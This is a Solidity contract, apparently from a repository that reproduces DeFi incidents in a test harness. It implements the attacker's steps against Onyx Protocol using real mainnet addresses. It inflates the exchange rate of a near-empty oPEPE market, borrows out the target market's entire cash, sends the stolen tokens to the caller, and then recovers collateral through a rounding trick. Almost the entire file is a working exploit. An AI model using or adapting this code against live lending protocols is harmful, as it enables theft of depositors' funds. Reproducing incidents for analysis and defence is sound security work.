// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import { TestHarness} from "../../TestHarness.sol"; 
import { TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import { IERC20 } from "../../interfaces/IERC20.sol";
import { ICERC20Delegator } from "./OnyxProtocol.attack.sol";
import { IComptroller } from "./OnyxProtocol.attack.sol";

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

contract Attacker2Contracts is TestHarness, TokenBalanceTracker {
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    ICERC20Delegator private constant oPEPE = ICERC20Delegator(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IComptroller private constant Unitroller = IComptroller(0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800);

    
    constructor(ICERC20Delegator oxnyToken) {
        addTokenToTracker(address(oxnyToken));
        updateBalanceTracker(address(this));
    }

    function start(
        ICERC20Delegator onyxToken
    ) external {
        console.log("------- Starting attack process", "\nTarget token:", address(onyxToken)); 
        
        
        PEPE.approve(address(oPEPE), type(uint256).max);
        oPEPE.mint(1e18);
        
        oPEPE.redeem(oPEPE.totalSupply() - 2);
        
        uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
        
        PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));
        

        
        address[] memory oTokens = new address[](1);
        oTokens[0] = address(oPEPE);
        Unitroller.enterMarkets(oTokens);
        
        onyxToken.borrow(onyxToken.getCash() - 1);
        console.log("Amount: " ,IERC20(onyxToken.underlying()).balanceOf(address(this)),"\n");
        

        if (onyxToken.underlying() == address(USDC)) {
            
            USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
            
        } else if (onyxToken.underlying() == address(USDT)) {
            
            USDT.transfer(msg.sender, USDT.balanceOf(address(this)));
        } else {
            
            IERC20(onyxToken.underlying()).transfer(msg.sender, IERC20(onyxToken.underlying()).balanceOf(address(this)));
        }
        
        
        oPEPE.redeemUnderlying(redeemAmt);
        (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
        
        (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(address(onyxToken), address(oPEPE), 1);
        
        uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
        
        oPEPE.mint(mintAmount);
        
        PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
    }

    receive() external payable {}
}
